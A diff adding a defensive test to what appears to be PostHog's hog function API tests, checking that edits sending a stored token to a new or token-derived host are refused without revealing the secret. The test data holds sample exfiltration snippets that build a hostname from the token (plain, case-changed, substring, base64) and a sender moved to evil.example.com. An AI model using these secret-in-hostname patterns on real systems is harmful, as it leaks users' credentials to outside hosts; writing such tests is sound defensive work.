@@ -28,6 +28,7 @@ from products.cdp.backend.api.hog_function import (
     comparable_content,
 )
 from products.cdp.backend.api.test.secret_sender import (
+    LEAKABLE_SECRET,
     MOVED_DETAIL,
     MOVED_SENDER_HOG,
     MOVED_URL,
@@ -1563,6 +1564,75 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
         stored = HogFunction.objects.get(id=function_id).encrypted_inputs["token"]
         assert stored["value"] == change.get("inputs", {}).get("token", {}).get("value", "I AM SECRET")
         assert stored["allowed_origins"] == expected_origins
+
+    @parameterized.expand(
+        [
+            (
+                "concatenated_into_the_host",
+                SENDER_HOG,
+                {"hog": "fetch(concat('https://leak-', inputs.token, '.example.com'));"},
+                "This change sends Token to an address built from Token. "
+                "Until now it was only sent to hooks.example.com.",
+            ),
+            *(
+                (
+                    f"{transform}_in_the_host",
+                    SENDER_HOG,
+                    {"hog": f"fetch(concat('https://', {transform}(inputs.token{extra}), '.example.com'));"},
+                    "PostHog can't tell where this change sends Token. Until now it was only sent to hooks.example.com.",
+                )
+                for transform, extra in [("lower", ""), ("upper", ""), ("substring", ", 1, 6"), ("base64Encode", "")]
+            ),
+            (
+                "read_by_an_input_template_in_the_host",
+                SENDER_HOG,
+                {"inputs": sender_inputs("https://{inputs.token}.example.com/a")},
+                "This change sends Token to an address built from Token. "
+                "Until now it was only sent to hooks.example.com.",
+            ),
+            (
+                "dictionary_entry_in_the_host",
+                SENDER_HOG,
+                {"hog": "fetch(concat('https://', inputs.token.tenant, '.example.com'), {'headers': inputs.token});"},
+                "PostHog can't tell where this change sends Token. Until now it was only sent to hooks.example.com.",
+                {"tenant": LEAKABLE_SECRET},
+            ),
+            (
+                "in_the_stored_host",
+                "fetch(concat('https://', inputs.token, '.example.com'));",
+                {"hog": MOVED_SENDER_HOG},
+                "This change sends Token to evil.example.com. Until now it was only sent to an address built from Token.",
+            ),
+        ]
+    )
+    def test_refused_save_never_reveals_the_secret(
+        self, _name: str, stored_hog: str, change: dict, expected_detail: str, secret: Any = LEAKABLE_SECRET
+    ) -> None:
+        token_schema = {
+            **SECRET_SENDER["inputs_schema"][1],
+            "type": "dictionary" if isinstance(secret, dict) else "string",
+        }
+        res = self.client.post(
+            f"/api/projects/{self.team.id}/hog_functions/",
+            data={
+                **SECRET_SENDER,
+                "hog": stored_hog,
+                "inputs_schema": [SECRET_SENDER["inputs_schema"][0], token_schema],
+                "inputs": {"url": {"value": SENDER_URL}, "token": {"value": secret}},
+            },
+        )
+        assert res.status_code == status.HTTP_201_CREATED, res.json()
+
+        with secret_host_binding_flag(True):
+            res = self.client.patch(f"/api/projects/{self.team.id}/hog_functions/{res.json()['id']}", data=change)
+
+        assert res.status_code == status.HTTP_400_BAD_REQUEST, res.json()
+        assert LEAKABLE_SECRET not in res.json()["detail"].lower()
+        assert (res.json()["attr"], res.json()["code"], res.json()["detail"]) == (
+            "inputs__token",
+            "secret_reentry_required",
+            f"{expected_detail} Enter it again to confirm.",
+        )
 
     @parameterized.expand(
         [
